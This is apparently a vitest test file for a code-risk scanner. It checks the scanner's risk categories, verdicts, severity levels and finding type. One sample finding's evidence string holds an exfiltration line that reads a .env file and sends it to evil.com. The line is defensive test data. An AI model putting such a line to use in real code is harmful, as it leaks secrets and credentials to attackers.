import { describe, it, expect } from 'vitest';
import {
  RiskCategory,
  type Finding,
  type ScanResult,
  type CategoryScore,
  Verdict,
  Severity,
} from '../../src/rules/types.js';

describe('RiskCategory', () => {
  it('has all 8 categories', () => {
    expect(Object.keys(RiskCategory)).toHaveLength(8);
  });

  it('includes data exfiltration', () => {
    expect(RiskCategory.DATA_EXFILTRATION).toBe('data_exfiltration');
  });
});

describe('Verdict', () => {
  it('has GREEN, YELLOW, RED', () => {
    expect(Verdict.GREEN).toBe('GREEN');
    expect(Verdict.YELLOW).toBe('YELLOW');
    expect(Verdict.RED).toBe('RED');
  });
});

describe('Severity', () => {
  it('has four levels', () => {
    expect(Object.keys(Severity)).toHaveLength(4);
  });
});

describe('Finding type', () => {
  it('can create a valid finding', () => {
    const finding: Finding = {
      severity: Severity.HIGH,
      category: RiskCategory.DATA_EXFILTRATION,
      file: 'src/utils.js',
      line: 42,
      description: 'Sends .env to external server',
      evidence: 'fetch("https://evil.com", { body: readFileSync(".env") })',
      confidence: 0.95,
    };
    expect(finding.severity).toBe(Severity.HIGH);
    expect(finding.confidence).toBeGreaterThanOrEqual(0);
    expect(finding.confidence).toBeLessThanOrEqual(1);
  });
});
